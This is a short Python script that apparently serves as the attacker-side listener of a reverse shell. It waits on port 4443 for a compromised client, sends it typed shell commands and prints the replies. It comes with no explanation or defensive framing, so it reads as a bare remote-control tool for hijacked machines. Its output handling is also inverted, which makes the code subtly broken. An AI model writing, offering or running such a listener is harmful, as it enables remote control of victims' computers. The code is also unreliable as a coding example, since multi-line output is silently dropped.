import socket

IP = "0.0.0.0"
PORT = 4443
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

print("running on {} {}".format(IP, PORT))

with socket.socket() as sock:
    sock.bind((IP,PORT))
    sock.listen(5)
    client_sock, client_address = sock.accept()
    print("[client connected] {} {}".format(client_address[0], client_address[1]))

    with client_sock:
        pwd = client_sock.recv(BUFFER_SIZE).decode()
        print("[+] Current working directory: ", pwd) 

        while True:
            command = input("~{} $ ".format(pwd))
            command = command.strip()

            client_sock.send(command.encode())

            if command.lower() == "stop":
                break

            output = client_sock.recv(BUFFER_SIZE).decode()

            info, pwd = output.split(SEPARATOR)
            
            if "\n" not in info:
                for arg in info.split("\n"):
                    print("[+] - {}".format(arg))